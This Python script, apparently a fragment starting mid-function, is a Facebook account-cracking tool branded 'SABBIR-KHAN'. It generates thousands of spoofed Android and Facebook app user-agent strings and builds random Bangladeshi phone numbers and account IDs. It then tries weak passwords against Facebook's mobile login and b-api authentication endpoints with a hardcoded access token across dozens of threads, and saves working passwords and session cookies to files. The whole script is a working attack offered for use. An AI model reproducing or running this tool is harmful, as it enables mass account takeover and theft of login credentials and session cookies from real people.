	e1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	f1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.35."+fb+";]"	 
	g1="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.25."+fb+";]"	 
	h1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	i1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	  
	j1="Mozilla/5.0 (Linux; Android "+vrs+"; Pixel 7 Build/TQ3A.230901.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.24."+fb+";]"	 
	k1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	l1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	m1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	n1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	return random.choice([a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv,ww,xx,yy,zz,a1,b1,c1,d1,e1,f1,g1,h1,i1,j1,k1,l1,m1,n1])
for tg in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	PINIK=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(PINIK)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for sat in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
#__________________[ M1 ]__________________#
def JAHID_M1():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_GB;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G928F;FBSV/11;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
#__________________[ M2 ]__________________#
def JAHID_M2():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/458.0.0.88.89;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Grameenphone;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/G7-L01;FBSV/12;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
#__________________[ M3 ]__________________#
def JAHID_M3():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/458.0.0.38.86;FBBV/584018577;FBDM/{density=3.0,width=1080,height=2069};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U1;FBSV/10;FBOP/19;FBCA/arm64-v8a;]"
        return ua    

def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
    
#--------------------------(LOGO BOX)--------------------------#
logo = f"""{A}
\033[38;5;46m███████╗ █████╗ ██████╗ ██████╗ ██╗██████╗     
\033[38;5;46m██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗    
\033[38;5;46m███████╗███████║██████╔╝██████╔╝██║██████╔╝    
\033[38;5;46m╚════██║██╔══██║██╔══██╗██╔══██╗██║██╔══██╗    
\033[38;5;46m███████║██║  ██║██████╔╝██████╔╝██║██║  ██║    
\033[38;5;46m╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝{G1}[{A}V{G1}/{A}06.7{G1}]                                                                                                                                                 
{A}———————————————————————————————————————————
 {A}({X1}+{A}){G1} OWNER    {A}:{G1} SABBIR-KHAN
 {A}({X1}+{A}){G2} FACEBOOK {A}:{G2} SABBIR-KHAN  
 {A}({X1}+{A}) {G3}TOOLTYPE {A}:{G3} RANDOM 💥
{A}———————————————————————————————————————————"""
#------------os clear def--------#
def clear():
	os.system('clear');print(logo)

#----------def linex-------#
def linex():
	print(f'{A}———————————————————————————————————————————')   
#--------------------------(MENU BOX)--------------------------#
class Cyber_Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        clear()
        os.system('xdg-open https://https://www.facebook.com/sk.sabbir.khan.2003')
        print(f' {A}[{G5}1{A}]{G1} BD RANDOM CLONE')
        print(f' {A}[{G5}0{A}]{G1} EXIT')
        linex()
        Shorif =input("\033[38;5;257m[\033[38;5;47m>\033[38;5;45m_\033[38;5;257m] \x1b[38;5;48mChoice : ")
        if Shorif in ["1", "01"]:
            cyber_2()
        if Shorif in ["2"," 02", "b"," B"]:
            main()
            exit()
            
            

#--------------------------(COLOUR BOX)--------------------------#

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def met2():
    
    add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
    
    main="[FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1"
    
    return add_ua+main
#--------------------------(CLONING MENU BOX)--------------------------#
def cyber_2():
    user=[]
    clear()
    print(f' {A}({G5}+{A}) {G1}NUMBER {A}>> {G1}016 {G2}017 018 {G3}019')
    linex()
    kode = input(' \033[38;5;257m[\033[38;5;47m>\033[38;5;45m_\033[38;5;257m] \x1b[38;5;48mChoice : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    linex() 
    print(f' {A}({G5}+{A}){G1} LIMIT {A}>>{G1} 2000. {G2}5000.{G3} 10000 ')
    linex()
    limit = int(input(' \033[38;5;257m[\033[38;5;47m>\033[38;5;45m_\033[38;5;257m] \x1b[38;5;48mChoice : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=90) as cyber:
        clear()
        tl = str(len(user))
        print(f' {A}({G5}+{A}){G1} SIM CODE :{G5} '+kode)
        print(f' {A}({G5}+{A}) {G2}CRACK ID : {G5}'+tl)
        linex()
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'jannatul','sumaiya','jannat','@@@###']
            cyber.submit(cyber_1,uid,pwx,tl)
    linex()
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    linex()
#--------------------------(MATHOD BOX)--------------------------#
def cyber_1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            pro = JAHID_M1()
            pro = JAHID_M2()
            pro = JAHID_M3()
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r {bi}~{A}/{bi}~{G5}(%sSABBIR{G5}){A} >> %s{A} >>{X5} %s{A} >>{G1} %s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://touch.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = { 'authority': 'x.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',  
           'dpr': '2',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
           'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"CPH2015"',
          'sec-ch-ua-platform': '"Android"',
          'sec-ch-ua-platform-version': '"9.0.0"',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origin',
          'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
         'user-agent':pro,} #https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\r{R}[{G1}SABBIR-ok{R}]{G1} ' +cid+ ' | ' +ps+    f'  \n{A}={G5}[{X}<>{G5}]{A}= {G4}'+coki+ ' ''  ')
                linex()
                open('/sdcard/SABBIR-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+' | '+uid+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"{X}[SABBIR-CP] {uid}|{ps}")
                open('/sdcard/SABBIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
def main():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;32mBLACK DRAGON OVER POWER ')
    print('\033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW')
    print('\033[;32mENJOY THIS TOOLS')
    linex()
    print('\033[1;32mAuther  : SABBIR-KHAN')
    print('\033[1;33mPower by : SABBIR-OFFICIAL')
    print('\033[1;32mFecbook : SABBIR-KHAN')
    linex()
    print(f'{G1}Crack Limit : {G2}2000,{G3}5000,{G4}10000,')
    linex()
    limit=input(f"{G3}[??] Input limit: ")
    os.system('clear')
    print(logo)
    linex()
    print(f'{G5}Choice any one and enjoy our tools🌺')
    linex()
    print(f"{G4}[{G1}1{G4}] Crack 2011-14 Id login After-3Day")
    print(f"{G5}[{G1}2{G4}] Crack 2009-10 Id login After-3Day")
    linex()
    ask=input(f"{G1}choice !>")
    linex()
    os.system('clear')
    print(logo)
    linex()
    print(f'{G5}Auther      : SABBIR')
    print(f'{G4}Power by    : SABBIR-KHAN')
    print(f'{G3}Crack Limit : {G5}'+limit)
    linex()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=50) as heron:
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    ua = random.choice(ugen)
    bo = random.choice([A,R,Y,G1,G2,G,G4,X,G5])
    try:
        sys.stdout.write(f"\r {bo}~{A}/{bo}~{G5}({bo}DARK-SHADOW{G5}) {A}>> {X1}{loop} {A}>> {len(oks)}\r")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","akashold","112233"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r [Just-Now] {uid} • {pw}")
                oks.append(uid)
                open("/sdcard/Just_Now-login.txt","a").write(uid+"|"+pw+"\n")
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{R}[{G2}SABBIR-OK🌺{R}]{G1} {uid} • {pw}")
                print(f'{X}Agent {A}>> '+ua+'')
                open("/sdcard/OLD_ID-loginAfter3day.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [Add-Mail] {uid} • {pw}")
                print(ua)
                oks.append(uid)
                open("/sdcard/OLD_ID-Add-Mail.txt","a").write(uid+"|"+pw+"\n")
            else:continue
        loop+=1
    except:pass 
    
    
    
Cyber_Main()